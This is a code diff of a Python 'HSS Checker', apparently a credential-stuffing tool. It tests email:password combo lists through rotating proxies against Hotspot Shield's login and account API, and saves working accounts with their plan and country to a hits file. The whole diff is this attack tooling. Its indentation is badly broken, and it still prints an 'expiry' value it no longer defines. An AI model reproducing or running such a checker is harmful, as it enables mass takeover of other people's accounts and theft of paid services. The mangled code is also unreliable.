@@ -11,7 +11,7 @@ def center(var:str, space:int=None): # From Pycenter
     if not space:
         space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines())/2)])) / 2
 
-         return "\n".join((' ' * int(space)) + var for var in var.splitlines())
+        return "\n".join((' ' * int(space)) + var for var in var.splitlines())
 
 class HSS:
     def __init__(self):
@@ -22,8 +22,9 @@ class HSS:
         self.cpm = 0  
         self.retries = 0   
         self.lock = threading.Lock()
-            def ui(self):
-        os.system('cls')
+
+        def ui(self):
+            os.system('cls')
         ctypes.windll.kernel32.SetConsoleTitleW(f'[HSS CHECKER v31] - Made by lkeld') 
         text = '''    
  ██░ ██   ██████   ██████     ▄████▄   ██░ ██ ▓█████  ▄████▄   ██ ▄█▀▓█████  ██▀███  
@@ -39,15 +40,15 @@ class HSS:
 '''
 
 faded = ''
-        red = 40
-        for line in text.splitlines():
+red = 40
+for line in text.splitlines():
             faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
             if not red == 255:
                 red += 15
                 if red > 255:
                     red = 255
-        print(center(faded))
-        print(center(f'{Fore.LIGHTYELLOW_EX}\ngithub.com/lkeld\n{Fore.RESET}'))
+                    print(center(faded))
+                    print(center(f'{Fore.LIGHTYELLOW_EX}\ngithub.com/lkeld\n{Fore.RESET}'))
 
 
 def cpmCounter(self):
@@ -58,15 +59,15 @@ def cpmCounter(self):
             self.cpm = (new-old) * 15
 
 
-    def updateTitle(self):
-        while True:
-            elapsed = time.strftime('%H:%M:%S', time.gmtime(time.time() - self.start))
+            def updateTitle(self):
+                while True:
+                    elapsed = time.strftime('%H:%M:%S', time.gmtime(time.time() - self.start))
             ctypes.windll.kernel32.SetConsoleTitleW(f'[HSS Checker V1] - Hits: {self.hits} | Bad: {self.bad} | Retries: {self.retries} | CPM: {self.cpm} | Threads: {threading.active_count() - 2} | Time elapsed: {elapsed}')
             time.sleep(0.4)
 
-    def getProxies(self):
-        try:
-            print(f'[{Fore.LIGHTBLUE_EX}>{Fore.RESET}] Path to proxy file> ')
+        def getProxies(self):
+            try:
+                print(f'[{Fore.LIGHTBLUE_EX}>{Fore.RESET}] Path to proxy file> ')
             path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'HSS CHECKER - Select proxy', multiple= False)
             open(path, "r", encoding="utf-8") 
 
@@ -77,16 +78,16 @@ choice = int(input(f'[{Fore.LIGHTBLUE_EX}?{Fore.RESET}] Proxy type [{Fore.LIGHTB
 
 if choice == 0:
                 proxytype = 'https'                          
-            elif choice == 1:
+                elif choice == 1:
                 proxytype = 'socks4'
-            elif choice == 2:
+                elif choice == 2:
                 proxytype = 'socks5'
-            else:
+                else:
                 print(f'[{Fore.RED}!{Fore.RESET}] Please enter a valid choice such as 0, 1 or 2!')
                 os.system('pause >nul')
                 quit()
 
- with open(path, 'r', encoding="utf-8") as f:
+    with open(path, 'r', encoding="utf-8") as f:
                 for l in f:
                     ip = l.split(":")[0]
                     port = l.split(":")[1]
@@ -137,13 +138,58 @@ if 'PWD INCORRECT' or '"status":false' in request.text:
                 self.lock.release()
 
  else:     
-                info = client.get("https://app.hotspotshield.com/api/user/login", headers ={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" ,"Accept-Encoding": "gzip, deflate, br" ,"Accept-Language": "en-US,en;q=0.9" ,"Connection": "keep-alive" ,"Host": "www.netflix.com" ,"Referer": "https://www.netflix.com/browse" ,"Sec-Fetch-Dest": "document" ,"Sec-Fetch-Mode": "navigate" ,"Sec-Fetch-Site": "same-origin" ,"Sec-Fetch-User": "?1" ,"Upgrade-Insecure-Requests": "1" ,"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"}, cookies =cookie, proxies =random.choice(self.proxies), timeout =10).text
-                plan = info.split('data-uia="plan-label"><b>')[1].split('</b>')[0]
-                country = info.split('","currentCountry":"')[1].split('"')[0]
-                expiry = info.split('data-uia="nextBillingDate-item">')[1].split('<')[0]
+                info = client.get("https://app.hotspotshield.com/api/user/info", headers ={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" ,"Accept-Encoding": "gzip, deflate, br" ,"Accept-Language": "en-US,en;q=0.9" ,"Connection": "keep-alive" ,"Host": "www.hotspotshield.com" ,"Referer": "https://app.hotspotshield.com/account" ,"Sec-Fetch-Dest": "document" ,"Sec-Fetch-Mode": "navigate" ,"Sec-Fetch-Site": "same-origin" ,"Sec-Fetch-User": "?1" ,"Upgrade-Insecure-Requests": "1" ,"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"}, cookies =cookie, proxies =random.choice(self.proxies), timeout =10).text
+                plan = info.split('"plan":"')[1].split('"},')[0]
+                country = info.split('country":"')[1].split('",')[0]
+                family = info.split('isFamilyMember":')[1].split('}}}')[0]
                 self.lock.acquire()
                 print(f'[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] {Fore.LIGHTBLUE_EX}HIT{Fore.RESET} | {email} | {password} | {plan} | {country} | {expiry}')
                 self.hits += 1
                 with open('hits.txt', 'a', encoding='utf-8') as fp:
                     fp.writelines(f'Email: {email} Pass: {password} - Plan: {plan} - Country: {country} - Validity: {expiry}\n')   
-                self.lock.release()
+                self.lock.release()\
+
+                 except:
+            self.lock.acquire()
+            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR{Fore.RESET} | Proxy timeout. Change your proxies or use a different VPN')
+            self.retries += 1
+            self.lock.release()
+
+                def worker(self, combos, thread_id):
+        while self.check[thread_id] < len(combos):
+            combination = combos[self.check[thread_id]].split(':')
+            self.checker(combination[0], combination[1])
+            self.check[thread_id] += 1 
+
+             def main(self):
+        self.ui()
+        self.getProxies()
+        self.getCombos()
+        try:
+            self.threadcount = int(input(f'[{Fore.LIGHTBLUE_EX}>{Fore.RESET}] Threads> '))
+        except ValueError:
+            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Value must be an integer')
+            os.system('pause >nul')
+            quit()
+               
+        self.ui()
+        self.start = time.time()
+        threading.Thread(target =self.cpmCounter, daemon =True).start()
+        threading.Thread(target =self.updateTitle ,daemon =True).start()
+        
+        threads = []
+        self.check = [0 for i in range(self.threadcount)]
+        for i in range(self.threadcount):
+            sliced_combo = self.combos[int(len(self.combos) / self.threadcount * i): int(len(self.combos)/ self.threadcount* (i+1))]
+            t = threading.Thread(target= self.worker, args= (sliced_combo, i,) )
+            threads.append(t)
+            t.start()
+
+        for t in threads:
+            t.join()
+
+        print(f'[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] Task completed')
+        os.system('pause>nul')
+        
+n = HSS()
+n.main()
